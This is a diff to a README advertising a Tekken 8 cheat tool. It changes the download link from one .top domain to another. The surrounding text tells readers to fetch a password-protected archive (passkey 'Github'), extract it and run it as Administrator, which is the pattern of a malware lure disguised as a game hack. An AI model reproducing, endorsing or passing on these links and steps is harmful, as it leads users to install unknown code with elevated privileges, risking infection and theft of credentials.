@@ -6,7 +6,7 @@ Tekken 8 hack with auto-block, perfect parry, infinite rage, frame data display,
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular mods like **Tekken Overlay** and **Rage Art Trainer**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Tekken 8.
 4. Run the hack **as Administrator**.
